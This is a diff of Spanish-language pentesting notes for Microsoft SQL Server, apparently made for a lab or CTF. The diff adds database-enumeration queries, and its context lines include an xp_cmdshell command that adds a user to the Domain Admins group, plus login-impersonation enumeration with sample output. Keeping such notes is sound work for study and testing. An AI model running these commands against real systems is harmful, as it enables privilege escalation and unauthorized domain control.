@@ -40,12 +40,23 @@
     ```
 - `EXEC xp_cmdshell 'net group "Domain Admins" manager\operator /add /domain';`
 
+## Enumerar DBs
+- `enum_db`
+- USE `<db>`: Cambiar de base de datos
+- `SELECT name FROM sys.tables;`
+- `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('dbo.<table>');`
+- `SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>>';`
+- `SELECT TABLE_SCHEMA, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'sysauth';`
+- `SELECT * FROM dbo.<table>;`
+
+
+
 
 ## Impersonar credenciales
 - `enum_impersonate`: esto te va a dar posibles usuarios que podemos impersonar
 
 ```
- 
+
 execute as   database   permission_name   state_desc   grantee          grantor          
 ----------   --------   ---------------   ----------   --------------   --------------   
 b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader   
